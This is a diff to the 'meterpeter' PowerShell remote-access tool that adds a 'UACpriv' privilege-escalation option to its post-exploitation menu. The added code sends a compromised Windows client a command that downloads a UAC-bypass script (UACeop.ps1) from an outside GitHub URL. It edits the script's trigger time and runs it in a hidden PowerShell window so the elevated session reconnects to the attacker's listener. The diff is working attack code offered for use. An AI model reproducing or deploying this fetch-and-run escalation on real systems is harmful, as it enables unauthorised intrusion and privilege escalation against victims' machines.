@@ -3125,10 +3125,30 @@ While($Client.Connected)
         write-host "   -------     -----------                   ------------------"
         write-host "   getadmin    Escalate client privileges    UserLand"
         write-host "   Delete      Delete getadmin artifacts     UserLand"
+        write-host "   UACpriv     use runas to spawn UAC diag   UserLand"
         write-host "   CmdLine     Uac execute command elevated  UserLand"
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green
         $Escal_choise = Read-Host;
+        If($Escal_choise -ieq "UACpriv")
+        {
+           $CurrentTime = (Get-Date -Format 'HH:mm')
+           write-host " - Input time to start eop (" -ForeGroundColor Red -NoNewline
+           write-host "$CurrentTime" -ForeGroundColor Yellow -NoNewline
+           write-host "): " -ForeGroundColor Red -NoNewline
+
+           $StartTime = Read-Host
+           If(-not($StartTime -match '^(\d+\d+:+\d+\d)$'))
+           {
+              write-host "   => Error: wrong time format [$StarTime]" -ForegroundColor Red
+              $Command = $null
+           }
+           Else
+           {
+              write-host " * Using RUNAS to elevate session!`n" -ForeGroundColor Green
+              $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){echo `"   `> Error: Abort, session allready running under Administrator token ..`" `> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force}Else{iwr -Uri https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/UACeop.ps1 -OutFile `$Env:TMP\UACeop.ps1|Out-Null;((Get-Content -Path `$Env:TMP\UACeop.ps1 -Raw) -Replace `"StartTime='20:20'`",`"StartTime='$StartTime'`")|Set-Content -Path `$Env:TMP\UACeop.ps1;echo `"   `> Triger EOP at: $StartTime hours.`" `> `$Env:TMP\EOPsettings.log;echo `"   `> Exit meterpeter connection and start a new listenner`" `>`> `$Env:TMP\EOPsettings.log;echo `"   `> using the same LHOST+LPORT to recive the connection.`" `>`> `$Env:TMP\EOPsettings.log;Get-Content `$Env:TMP\EOPsettings.log;Remove-Item -Path `$Env:TMP\EOPsettings.log -Force;Start-Process -WindowStyle hidden powershell.exe -ArgumentList `"-file `$Env:TMP\UACeop.ps1`"}"
+           }
+        }
         If($Escal_choise -ieq "GetAdmin")
         {
           write-host " - Input execution delay time  : " -ForeGroundColor Red -NoNewline
